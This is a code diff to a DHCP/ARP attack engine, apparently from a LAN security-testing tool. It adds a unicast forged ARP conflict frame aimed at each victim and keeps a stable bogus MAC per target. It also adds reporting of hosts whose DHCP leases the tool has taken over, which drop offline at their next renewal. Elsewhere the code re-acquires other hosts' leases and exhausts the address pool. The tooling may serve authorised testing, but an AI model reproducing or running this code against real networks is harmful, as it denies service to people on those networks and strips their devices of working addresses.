@@ -581,6 +581,39 @@ class DhcpEngine:
     def _finding_severity_key(self, f: Finding) -> int:
         return self._SEVERITY_ORDER.get(f.severity, 3)
 
+    def _granted_ips(self) -> set[str]:
+        """Addresses this run re-acquired *by name* (§5f `granted`) -- the ones the server has
+        now bound to us, whoever is still using them.
+
+        One definition, three callers: eviction target selection (`_evict_phase()`), the
+        neighbour roll-call, and the eviction findings. They must agree on this set exactly --
+        the roll-call calls a host `lease_taken` on the strength of it, and the findings claim
+        a pending outage on the strength of it, so a drift here would have two surfaces
+        disagreeing about whose lease we hold.
+        """
+        return {
+            ip
+            for xid, ip in self._reacquire_targets.items()
+            if self._reacquire_outcomes.get(xid) == "granted"
+        }
+
+    def _renewal_suffix(self, ip: str) -> str:
+        """`" (within ~12h)"` when the pool's lease duration is known, `""` when it isn't.
+
+        Deliberately an **upper bound, not a countdown.** We know L, the lease duration the
+        server handed *us* for this address, but not when the victim originally got its own
+        lease. Its renewal fires at 0.5 x L (RFC 2131 §4.4.5's T1) after that unknown start,
+        and its lease was still live when this run began -- it answered our ARP sweep -- so the
+        only honest statement is "sometime within the next L/2", which may well be seconds from
+        now. Printing a precise deadline would be inventing precision we do not have, the same
+        rule that keeps hostnames blank rather than guessed (§5a).
+        """
+        lease_time = next(
+            (ln.lease_time for ln in reversed(self.cleanup.all()) if ln.ip == ip and ln.lease_time),
+            None,
+        )
+        return f" (within ~{_fmt_duration(int(lease_time // 2))})" if lease_time else ""
+
     # How each eviction rung reads in the roll-call: (category, plain-language outcome).
     # Only apipa/discover_unanswered mean "no working address right now" -- `rediscovered`
     # restarted but *was served*, so it is emphatically not offline.
@@ -611,19 +644,25 @@ class DhcpEngine:
           the server has handed us their address, so they fail at their next renewal, silently,
           with nothing observable from here (same epistemics as `_reprobe_released()` being
           colour only, §5f).
+        * **`defended` on an address we now hold is `lease_taken`, not `reacted`** (2.7.1).
+          Eviction only ever targets addresses re-acquisition granted, so a target that
+          defended won the *ARP* exchange while the *lease* underneath it had already been
+          reassigned to us. Reporting that as "defended its address" -- which this did until
+          2.7.1 -- describes the packet exchange and hides the outcome: the host is sitting on
+          a binding the server no longer believes in and drops at its next renewal, exactly
+          like a silent `lease_taken` host. The other rungs still outrank the inferred state,
+          because they are all *better* news or *worse* news than a stolen binding, not the
+          same news: `apipa`/`discover_unanswered` mean it has no address at all right now, and
+          `declined`/`rediscovered` mean it is no longer on the stolen address to begin with.
 
-        An observed eviction rung always wins over the inferred states -- it is the better
-        evidence, and eviction only ever targets addresses re-acquisition granted, so every
-        evicted host is also a `lease_taken` candidate.
+        An observed eviction rung otherwise wins over the inferred states -- it is the better
+        evidence -- except that being denied service outright (`denied_macs`) still outranks a
+        stolen binding, since that is present-tense outage against a future one.
         """
         neighbors = list(self._neighbors_by_mac.values())
         if not neighbors:
             return []
-        granted_ips = {
-            self._reacquire_targets[xid]
-            for xid, outcome in self._reacquire_outcomes.items()
-            if outcome == "granted" and xid in self._reacquire_targets
-        }
+        granted_ips = self._granted_ips()
         # MACs that asked for an address during this run and never got one -- denial of service
         # by pool exhaustion rather than by ARP conflict
         denied_macs = {
@@ -639,13 +678,19 @@ class DhcpEngine:
         rows: list[tuple[str, str, str, str, str]] = []
         for n in neighbors:
             rung = self._evict.outcomes.get(n.ip)
-            if rung in self._RUNG_ROLLCALL:
+            defended_on_stolen = rung == "defended" and n.ip in granted_ips
+            if rung in self._RUNG_ROLLCALL and not defended_on_stolen:
                 category, outcome = self._RUNG_ROLLCALL[rung]
             elif n.mac in denied_macs:
                 category, outcome = "offline", "asked for an address, got none (pool drained)"
             elif n.ip in granted_ips:
                 category = "lease_taken"
-                outcome = "lease taken by us -- still using it, fails at next renewal"
+                lead = (
+                    "defended it, but we hold the lease"
+                    if defended_on_stolen
+                    else "lease taken by us -- still using it"
+                )
+                outcome = f"{lead}, fails at next renewal{self._renewal_suffix(n.ip)}"
             else:
                 category, outcome = "unaffected", "unaffected"
             rows.append((n.ip, n.mac, hostname_by_mac.get(n.mac, ""), outcome, category))
@@ -1064,10 +1109,22 @@ class DhcpEngine:
                 # force -- see the outcome-ladder table in _evict_phase()'s module docstring.
                 fail_rungs = {"declined", "rediscovered", "discover_unanswered", "apipa"}
             evicted = {ip: rung for ip, rung in self._evict.outcomes.items() if rung in fail_rungs}
+            # (2.7.1) Targets that defended an address the server has already reassigned to us.
+            # Held out of `reacted` and reported on their own: "defended" describes the ARP
+            # exchange, but the lease under them is gone, so calling that merely INCONCLUSIVE
+            # (which is what CLIENTS_DEFENDED_ADDRESSES is) understates a pending outage with a
+            # known cause. Mode-independent -- unlike the rungs above it, this doesn't turn on
+            # whether the pool was drained, only on whether the server gave us the binding.
+            granted_ips = self._granted_ips()
+            holding = sorted(
+                ip
+                for ip, rung in self._evict.outcomes.items()
+                if rung == "defended" and ip in granted_ips
+            )
             reacted = {
                 ip: rung
                 for ip, rung in self._evict.outcomes.items()
-                if rung not in fail_rungs and rung != "no_reaction"
+                if rung not in fail_rungs and rung != "no_reaction" and ip not in holding
             }
             by_rung: dict[str, int] = {}
             for rung in self._evict.outcomes.values():
@@ -1099,13 +1156,32 @@ class DhcpEngine:
                         },
                     )
                 )
-            else:
+            elif not holding:
                 self._raise(
                     findings.build(
                         "ARP_CONFLICTS_UNANSWERED",
                         {
                             "targets": len(self._evict.outcomes),
                             "rounds": self.cfg.evict_rounds,
+                        },
+                    )
+                )
+            # Outside the chain above, not another branch of it: `holding` is a different
+            # population than `evicted`/`reacted`, so it is reported whenever it is non-empty.
+            if holding:
+                self._raise(
+                    findings.build(
+                        "CLIENTS_HOLDING_STOLEN_LEASES",
+                        {
+                            "targets": len(self._evict.outcomes),
+                            "holding": len(holding),
+                            "addresses": [
+                                f"{ip} defended the conflict, but we hold its lease -- "
+                                f"fails at next renewal{self._renewal_suffix(ip)}"
+                                for ip in holding
+                            ],
+                            "rounds": self.cfg.evict_rounds,
+                            "mode": self.cfg.mode.value,
                         },
                     )
                 )
@@ -1213,38 +1289,60 @@ class DhcpEngine:
     def _do_arp_conflict(self, targets: list[Neighbor]) -> int:
         """One ARP-conflict round over `targets` (rewrite of the old `_do_garp`, 2.3).
 
-        Returns frames sent. Unit-testable. Per target, two frames:
+        Returns frames sent. Unit-testable. Per target, up to three frames:
           1. broadcast ARP *request*  claiming the victim's own IP  (announcement form)
           2. broadcast ARP *reply*    claiming the victim's own IP  (unsolicited form)
+          3. unicast   ARP *reply*    the same claim, addressed straight to the victim
+             (2.7.1, `build_arp_conflict_unicast`; skipped when the victim's real MAC is
+             unknown, which the ARP inventory means is never the case in practice)
 
-        Both trip duplicate-address detection on a well-behaved host; RFC 5227 SS2.4 has the
+        Each trips duplicate-address detection on a well-behaved host; RFC 5227 SS2.4 has the
         host defend once, then go quiet on a second conflict inside DEFEND_INTERVAL (10s) —
-        which is what repeated rounds from `_evict_worker()` are for.
+        which is what repeated rounds from `_evict_worker()` are for. Frames 1 and 2 differ
+        because stacks honour different forms; frame 3 differs in *delivery* rather than form,
+        and is there for the segments where a broadcast never reaches the victim at all (§5b).
 
-        The claimed MAC is always a fresh `random_mac()`, recorded in `_evict.bogus_macs` so
-        the ARP observer can tell our forgeries apart from real hosts. It must never be ours or
-        the victim's real MAC — a bogus MAC blackholes the claim (nothing answers for it, so
-        the victim's own traffic just goes nowhere and it notices the conflict); our own MAC
-        would instead intercept the victim's traffic, which is out of scope for this tool.
+        The claimed MAC is bogus and stable per target for the whole eviction
+        (`_evict.forged_mac_by_ip`, 2.7.1 — see `EvictionState` for why it is not re-rolled per
+        round), recorded in `_evict.bogus_macs` so the ARP observer can tell our forgeries apart
+        from real hosts. It must never be ours or the victim's real MAC — a bogus MAC blackholes
+        the claim (nothing answers for it, so the victim's own traffic just goes nowhere and it
+        notices the conflict); our own MAC would instead intercept the victim's traffic, which
+        is out of scope for this tool.
 
-        (2.3) No longer takes a `gateway` parameter or sends a third unicast frame blackholing
-        the victim's default route via `build_arp_poison()` — that crossed from denial-of-
-        service into traffic-interception-adjacent territory and added nothing eviction needs.
+        (2.3) No longer takes a `gateway` parameter or sends a frame blackholing the victim's
+        default route via `build_arp_poison()` — that crossed from denial-of-service into
+        traffic-interception-adjacent territory and added nothing eviction needs. The unicast
+        frame above is not a reintroduction of it: it contests the victim's *own* address, the
+        same claim as the broadcasts, and points at a blackhole rather than at us.
         Not gated on `self._stop`: this only ever runs from within `stop()` (or the release
         worker's own finishing sequence, Phase 5), by which point `_stop` is already set for
         every *other* purpose, and gating here would mean eviction never sends anything.
         """
         sent = 0
         for n in targets:
-            bogus = netutils.random_mac()
-            self._evict.bogus_macs.add(bogus)
-            for op, label in ((packets.ARP_REQUEST, "request"), (packets.ARP_REPLY, "reply")):
-                pkt = packets.build_garp(n.ip, bogus, op=op)
+            bogus = self._evict.forged_mac_by_ip.get(n.ip)
+            if bogus is None:
+                bogus = netutils.random_mac()
+                self._evict.forged_mac_by_ip[n.ip] = bogus
+                self._evict.bogus_macs.add(bogus)
+            frames = [
+                (packets.build_garp(n.ip, bogus, op=packets.ARP_REQUEST), "request, broadcast"),
+                (packets.build_garp(n.ip, bogus, op=packets.ARP_REPLY), "reply, broadcast"),
+            ]
+            if n.mac:
+                frames.append(
+                    (
+                        packets.build_arp_conflict_unicast(n.ip, bogus, n.mac),
+                        f"reply, unicast to {n.mac}",
+                    )
+                )
+            for pkt, label in frames:
                 if self._send(pkt, target_ip=n.ip):
                     sent += 1
                     self.arp_conflicts += 1
                     self._debug(
-                        f"ARP conflict {label} (op={op}) broadcast: claiming {n.ip} is at "
+                        f"ARP conflict ({label}): claiming {n.ip} is at "
                         f"{bogus} (real owner {n.mac or '?'})"
                     )
             self.bus.emit(ev.ArpConflictSent(ip=n.ip))
@@ -1274,11 +1372,7 @@ class DhcpEngine:
         if not self.cfg.evict:
             self._debug("evict phase skipped: evict is disabled")
             return
-        granted_ips = {
-            ip
-            for xid, ip in self._reacquire_targets.items()
-            if self._reacquire_outcomes.get(xid) == "granted"
-        }
+        granted_ips = self._granted_ips()
         if not granted_ips:
             self._debug("evict phase: no re-acquired addresses to evict from")
             return
@@ -2555,6 +2649,16 @@ class DhcpEngine:
 
 def _rand_xid() -> int:
     return random.randint(1, 900000000)
+
+
+def _fmt_duration(seconds: int) -> str:
+    """`90000 -> '25h'`, `5400 -> '90m'`, `45 -> '45s'`. One unit, rounded, for prose in a
+    roll-call row -- a lease bound of "~12h" carries every bit of the meaning "~11h58m" does."""
+    if seconds >= 3600:
+        return f"{round(seconds / 3600)}h"
+    if seconds >= 60:
+        return f"{round(seconds / 60)}m"
+    return f"{seconds}s"
 
 
 def _opts_summary(pkt) -> str:
